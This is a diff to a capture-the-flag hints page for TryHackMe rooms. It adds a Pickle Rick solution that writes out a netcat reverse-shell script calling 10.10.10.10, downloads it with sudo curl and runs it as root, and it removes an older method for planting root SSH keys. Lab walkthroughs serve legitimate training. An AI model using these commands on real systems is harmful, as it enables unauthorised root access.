@@ -2,6 +2,7 @@
 
 ## Free Rooms Index
 <a href="#LinuxFundamentals1">Linux Fundamentals 1</a><br>
+<a href="#PickleRick">Pickle Rick</a><br>
 <a href="#Wonderland">Wonderland</a><br>
 <br>
 ## Subscriber Rooms Index
@@ -28,6 +29,38 @@ Doing <code>strings shiba1</code> and review shows it includes the line "cat /et
 -rw-r--r-- 1 root root 9 Feb 13  2020 /etc/shiba/shiba2<br>
 This is readable by any local user, so shiba1 can <code class="language-plaintext highlighter-rouge">cat /etc/shiba/shiba2</code> for the password.<br>
       
+</details>
+</details>
+</details>
+
+<br>
+<h4 id="PickleRick"><a href="https://www.tryhackme.com/room/picklerick">Pickle Rick</a></h4>
+When the web command portal is found, the clue encourages you to keep working with this access. There is another method that is easier.<br>
+<details>
+<summary>Hint 1 (<i>click to expand</i>)</summary>
+  
+Always check the permissions for your user.
+
+<details>
+<summary>Hint 2</summary>
+  
+A shell for the machine would remove limitations imposed on the web command portal.
+
+<details>
+<summary>Solution</summary>
+
+It's possible to finish the Room quickly with the web command portal after checking the www-data user's <code class="language-plaintext highlighter-rouge">sudo -ll</code> and learning they have root access through sudo without a password. It's also possible to get a root shell by creating a local file called shell.sh as:<br>
+```bash
+#!/bin/bash
+mkfifo /tmp/lol
+nc 10.10.10.10 8008 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
+```
+<br>
+Serve from local with <code class="language-plaintext highlighter-rouge">python3 -m http.server 8009</code> then pull it to the target through the web command portal with:<br>
+<code class="language-plaintext highlighter-rouge">sudo curl http://10.10.10.10:8009/shell.sh -o /tmp/shell.sh</code><br>
+ After the transfer, stop the local http.server and replace with a local listener to catch the shell using <code class="language-plaintext highlighter-rouge">nc -nlvp 8008</code>.<br>
+Finish by using the web command portal to modify the file as <code class="language-plaintext highlighter-rouge">sudo chmod +x /tmp/shell.sh</code> and then execute with <code class="language-plaintext highlighter-rouge">sudo /tmp/shell.sh</code> to connect.<br>
+ 
 </details>
 </details>
 </details>
@@ -70,20 +103,4 @@ reveals the two lines, separated from everything else, that can be entered to co
 <br>
 ### Subscriber Rooms Extra Challenges
 tbd<br>
-<br>
-## Retired Challenges
-This is a collection of extra tasks for TryHackMe Rooms that have been patched since they were discovered, and are no longer available.
-
-#### Pickle Rick
-A previous version of the machine allowed full sudo in the web command portal. The challenge was to get a root login, which was not a necessary task for completing the Room as intended. The method had an extra step, because it was not possible to `cd` out of /var/www/html. Generating ssh keys in the place required by /etc/ssh/sshd_cofig involved adding an argument to `ssh-keygen`:<br>
-extra credit - get shell on box<br>
-all work done through web command portal<br>
-<br>
-`sudo mkdir /root/.ssh`<br>
-`sudo ssh-keygen -f /root/.ssh/id_rsa -t rsa -b 2048`<br>
-`sudo cp /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys`<br>
-`sudo less /root/.ssh/id_rsa` (copy/paste to text editor and save local)<br>
-<br>
-on local: `chmod 600 id_rsa`<br>
-login as: `ssh -i id_rsa root@$target`<br>
 <br>
